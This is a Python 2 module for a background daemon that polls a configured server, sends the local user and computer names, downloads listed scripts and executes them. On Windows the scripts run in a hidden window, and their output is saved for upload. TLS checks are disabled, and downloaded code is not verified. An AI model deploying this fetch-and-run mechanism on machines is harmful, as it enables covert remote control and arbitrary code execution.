# -*- coding: utf-8 -*-
# from __future__ import unicode_literals

import os
import sys
import threading
import utils
import time
import subprocess
import base64
import logger
import requests
from config import config
from hashlib import md5
from utils import fmt


log = logger.getLogger(config['NAME'], config['LOGLEVEL'])


class Scripter(threading.Thread):
    """
    Скачивает config[EXCLUDE_CHR]script.md5 со списком файлов каждые timeout с.
        Формат config[EXCLUDE_CHR]script.md5:
            md5sum filename command
        Command = [wait [timeout]|nowait|None]
    Если command = wait, то запускается filename и ожидает завершения timeout или 60с если не задан.

    Download config[EXCLUDE_CHR]script.md5 with list of files every 10s.
        Format: md5sum filename command
        Command = [wait [timeout]|nowait|None]
    If command is "wait" then exec filename and wait for complete timeout or 60 seconds if not specified
    """

    def __init__(self):
        threading.Thread.__init__(self)
        self.name = __name__
        self.daemon = True
        self.active = False
        self.datadir = os.path.join(config['HOME_DIR'], config['NAME'], utils.get_user_name())

        self.script_dir = os.path.join(self.datadir, 'script')
        self.md5file = os.path.join(self.script_dir, fmt("{EXCLUDE_CHR}script.md5", **config))

        utils.makedirs(self.script_dir)
        utils.makedirs(self.datadir)
        self.params = {"username": utils.utf(utils.get_user_name()),
                       'compname': utils.utf(utils.get_comp_name())}
        self.jreq = {'jsonrpc': '2.0', 'method': 'script', 'id': __name__, 'params': self.params}
        self.auth = requests.auth.HTTPDigestAuth(*config['AUTH'])

        self.headers = {'user-agent': fmt("{NAME}/{VERSION}", **config)}

    def _check_jres(self, jres):
        if self.jreq['id'] != jres['id']:
            raise ValueError('Invalid ID')
        if 'error' in jres:
            raise Exception(jres['error']['message'])
        return jres

    def run(self):
        log.info(fmt('Start daemon: {0}', self.name))
        self.active = True
        prev_timeout, timeout = 13, 21
        while self.active:
            try:
                utils.makedirs(os.path.dirname(self.md5file))
                utils.makedirs(self.datadir)
                self.params['filename'] = os.path.basename(self.md5file)
                self.jreq['params'] = self.params
                self.jreq['id'] = time.time()
                log.debug(fmt('Try to download: {fn}', fn=self.params['filename']))
                r = requests.post(config['URL'], json=self.jreq, headers=self.headers,
                                  auth=self.auth, verify=False, timeout=(1, 5))
                r.raise_for_status()
                jres = self._check_jres(r.json())
                content = base64.b64decode(jres['result'])
                if not (os.path.exists(self.md5file) and md5(content).hexdigest() ==
                        md5(open(self.md5file, 'rb').read()).hexdigest()):
                    filelist = self.parse_index(content)
                    if self.download(filelist):
                        with open(self.md5file, 'wb') as fp:
                            fp.write(content)
                    self.execute(filelist)

                prev_timeout, timeout = 13, 21
            except Exception as e:
                log.error(e)
                if timeout < 60:
                    prev_timeout, timeout = timeout, prev_timeout + timeout

            time.sleep(timeout)

    def stop(self):
        log.info(fmt('Stop daemon: {0}', self.name))
        self.active = False

    def download(self, filelist):
        """
        :indexlist: tuple of dictionaries represented of md5 file
        :return: True if successful or False if other
        """
        if not filelist:
            return False
        with requests.Session() as sess:
            sess.auth = self.auth
            sess.timeout = (1, 5)
            sess.headers = self.headers
            for index in filelist:
                try:
                    self.params['filename'] = index.get('filename')
                    self.jreq['params'] = self.params
                    self.jreq['id'] = time.time()
                    log.debug(fmt('Try to download: {fn}', fn=self.params['filename']))
                    r = sess.post(config['URL'], json=self.jreq, verify=False)
                    r.raise_for_status()
                    jres = self._check_jres(r.json())
                    content = base64.b64decode(jres['result'])
                    fn = os.path.join(self.script_dir, self.params['filename'])
                    if not (os.path.exists(fn) and index.get('md5sum') == md5(open(fn, 'rb').read()).hexdigest()):
                        log.debug(fmt('Try to save: {fn}', fn=fn))
                        with open(fn, 'wb') as fp:
                            fp.write(content)

                except Exception as e:
                    log.error(e)
                    return False
            return True

    def execute(self, filelist):
        for index in filelist:
            try:
                fn = os.path.join(self.script_dir, index.get('filename'))
                self.exec_script(fn, index.get('cmd'))
            except Exception as e:
                log.error(e)

    def parse_index(self, indexdata):
        """
        :indexdata: raw data of md5 file
        :return: tuple of dictionaries represented of md5 file
        """
        index_obj = []
        for line in indexdata.splitlines():
            values = utils.split(line, 2)
            if len(values) > 1:
                index = {"md5sum": values[0],
                         "filename": utils.true_enc(values[1].strip("*")),
                         "cmd": values[2] if len(values) > 2 else None}
                index_obj.append(index)
        return index_obj

    def parse_cmd(self, cmds):
        res = dict(wait=False,
                   timeout=300)
        try:
            pos = cmds.index('wait')
            res['wait'] = True
            if pos < len(cmds) - 1:
                res['timeout'] = int(cmds[pos + 1])
        except:
            pass
        try:
            pos = cmds.index('exec')
            if pos < len(cmds) - 1:
                res['timeout'] = int(cmds[pos + 1])
        except:
            pass
        return res

    def exec_script(self, script_file, cmd):
        """
        :script_file: Filename to execute
        :cmd: Если command = wait, то запускается script_file и ожидает завершения timeout или 300с если не задан.
        По окончании пишет out file, который будет загружен на сервер модулем uploader.
        Если command = exec, то запускается script_file на timeout или 300с если не задан без ожидания завершения.

        :raise  CalledProcessError if return code is not zero
        """
        if not cmd:
            return False

        log.info(fmt('Try to execute: {sf} with command: {cmd}', sf=script_file, cmd=cmd))
        if sys.platform.startswith('win'):
            si = subprocess.STARTUPINFO()
            si.dwFlags = subprocess.STARTF_USESHOWWINDOW
            si.wShowWindow = subprocess.SW_HIDE
        else:
            si = None

        os.chmod(script_file, 0755)

        cmd_opt = self.parse_cmd(utils.split(cmd))
        proc = subprocess.Popen(script_file, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                shell=False, cwd=os.path.dirname(script_file), startupinfo=si)
        threading.Timer(cmd_opt['timeout'], proc.kill).start()
        if cmd_opt['wait']:
            script_out = proc.communicate()[0]
            f = os.path.join(os.path.dirname(script_file), os.path.basename(script_file).lstrip(config['EXCLUDE_CHR']))
            cmd_out_file = fmt("{fn}.out", fn=f)
            log.debug(fmt('Try to save: {fn}', fn=cmd_out_file))
            with open(cmd_out_file, 'wb') as fp:
                fp.write(script_out)

            if proc.returncode != 0:
                raise subprocess.CalledProcessError(
                    returncode=proc.returncode, cmd=script_file, output=script_out)


if __name__ == "__main__":
    t = Scripter()
    t.start()
    t.join()
